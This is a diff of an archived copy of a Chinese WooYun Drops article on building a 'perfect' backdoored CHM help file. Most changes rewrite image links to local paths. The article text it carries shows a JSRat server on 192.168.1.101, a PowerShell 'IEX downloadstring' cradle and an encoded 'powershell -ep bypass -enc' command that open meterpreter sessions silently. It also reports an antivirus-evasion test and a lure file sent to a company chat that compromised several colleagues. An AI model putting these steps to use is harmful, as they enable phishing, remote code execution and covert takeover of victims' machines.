@@ -3,12 +3,12 @@
 			<head>
 			     <title>高级组合技打造“完美” 捆绑后门 - Evi1cg</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/14254">http://drops.wooyun.org/tips/14254</a></h1>
 				
       <p>
-        </p><p><img src="http://static.wooyun.org//drops/20160330/2016033009293473432137.jpg" alt=""></p>
+        </p><p><img src="../images_result/images/2016033009293473432137.jpg" alt=""></p>
 
 <!--more-->
 
@@ -34,15 +34,15 @@
 
 <p>新建如下目录，文件内容随意：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009293521321260.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009293521321260.png" alt="Alt text"></p>
 
 <p>打开EasyCHM，新建->浏览。选择该目录。默认文件类型：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009293791880349.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009293791880349.png" alt="Alt text"></p>
 
 <p>点击确认，即可看到预览的CHM文件：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009293939670426.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009293939670426.png" alt="Alt text"></p>
 
 <p>选择编译，即可编译成CHM文件。</p>
 
@@ -52,7 +52,7 @@
 
 <p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8abbbe6f333e6d100e6c1d3c6f0a13cae3fee2fff8f8e3e9ebe4effafe">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> 在twitter上发了一个demo，通过CHM运行计算器：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009294017043522.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009294017043522.png" alt="Alt text"></p>
 
 <p>利用代码如下：</p>
 
@@ -73,7 +73,7 @@ x.Click();
 
 <p>将以上代码写入html，置于工程目录进行编译，生成CHM文件，运行此文件，弹出计算器：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009294253557622.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009294253557622.png" alt="Alt text"></p>
 
 <h1>0x04 去除弹框</h1>
 
@@ -81,7 +81,7 @@ x.Click();
 
 <p>有测试过nishang <a href="https://raw.githubusercontent.com/samratashok/nishang/master/Client/Out-CHM.ps1">Out-CHM</a> 的同学会发现，运行生成的CHM文件的时候会看到明显的弹框。就像这样:</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/pop.gif" alt="Alt text"></p>
+<p><img src="../images_result/images/pop.gif" alt="Alt text"></p>
 
 <p>某个晚上突然脑洞了一下，想到了一个好的方式来让他不显示弹框，即结合使用<a href="http://drops.wooyun.org/tips/11764">JavaScript Backdoor</a>。经过测试，成功实现在不弹框的情况下获取meterpreter会话，此次测试使用一个我修改过的python版 JSRat.ps1 ，地址为：<a href="https://github.com/Ridter/MyJSRat">MyJSRat</a>。使用方式详见 readme。</p>
 
@@ -95,7 +95,7 @@ x.Click();
 python MyJSRat.py -i 192.168.1.101 -p 8080
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009294537083819.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009294537083819.png" alt="Alt text"></p>
 
 <p>访问 http://192.168.1.101:8080/wtf 获取攻击代码如下：</p>
 
@@ -122,7 +122,7 @@ x.Click();
 
 <p>编译以后运行，可以成功获取JS交互shell:</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/2016033009294779062919.png" alt="Alt text"></p>
+<p><img src="../images_result/images/2016033009294779062919.png" alt="Alt text"></p>
 
 <blockquote>
   <p>直接执行<code>cmd /c command</code> 是会有黑框的，可以使用run来避免显示黑框。执行run以后，输入 <code>whoami &gt; e:\1.txt</code> 之后通过read 来获取回显。</p>
@@ -181,7 +181,7 @@ IEX $n.downloadstring('http://192.168.1.101:8081/');
 cat power.txt | iconv --to-code UTF-16LE |base64
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330092949753731018.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330092949753731018.png" alt="Alt text"></p>
 
 <p>最终要执行的powershell命令为：</p>
 
@@ -197,7 +197,7 @@ python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG
 
 <p>测试过程中，从运行CHM到获取meterpreter，客户端无明显异常，全程无黑框弹出，获取到meterpreter会话如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330092952211491123.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330092952211491123.png" alt="Alt text"></p>
 
 <h3>3、是否被杀？</h3>
 
@@ -205,7 +205,7 @@ python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG
 
 <p><a href="http://r.virscan.org/report/6173ee9c62d29806bb84035a8f1738ba">http://r.virscan.org/report/6173ee9c62d29806bb84035a8f1738ba</a></p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330092954126811220.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330092954126811220.png" alt="Alt text"></p>
 
 <h1>0x05 利用场景</h1>
 
@@ -213,7 +213,7 @@ python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG
 
 <p>一张图说明（让我猜猜你会不会点）：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330092958139941316.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330092958139941316.png" alt="Alt text"></p>
 
 <blockquote>
   <p>注: 随便找了几个漏洞利用工具修改了文件名，并不代表原作者分享的工具有问题。</p>
@@ -225,7 +225,7 @@ python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG
 
 <p>是用上述方式制作chm文件，命名为一个比较有吸引力的名字，比如在公司技术群发了一个名字为"制作免杀后门.chm"的文件，实际测试结果如下图：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160331/2016033107010256555shell.jpg" alt=""></p>
+<p><img src="../images_result/images/2016033107010256555shell.jpg" alt=""></p>
 
 <p>成功获取多个人的meterpreter会话。</p>
 
@@ -235,7 +235,7 @@ python MyJSRat.py -i 192.168.1.101 -p 8080 -c "powershell -ep bypass -enc IAAkAG
 
 <p>目前我还没查到什么防御的姿势，知道的小伙伴可以分享一下。最好就是提高个人安全意识，对于这类文件，多注意一下，尽量别乱点，如果非要点，可以放到虚拟机里面。使用procexp.exe可以看到存在后门的chm文件会开启新的进程：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160330/20160330093000637281414.png" alt="Alt text"></p>
+<p><img src="../images_result/images/20160330093000637281414.png" alt="Alt text"></p>
 
 <p>对于碰到这种后门，怎么溯源呢，其实也很简单，chm是可以反编译为html的。
 使用windows自带的hh.exe 则可进行反编译。命令如下：</p>
@@ -246,7 +246,7 @@ C:\Users\evi1cg\Desktop&gt;hh -decompile test poc.chm #test 为当前目录的te
 
 <p>执行结果如下：</p>
 
-<p><img src="http://static.wooyun.org//drops/20160331/20160331070305505241459313642951.png" alt=""></p>
+<p><img src="../images_result/images/20160331070305505241459313642951.png" alt=""></p>
 
 <h1>0x08 小结</h1>
 
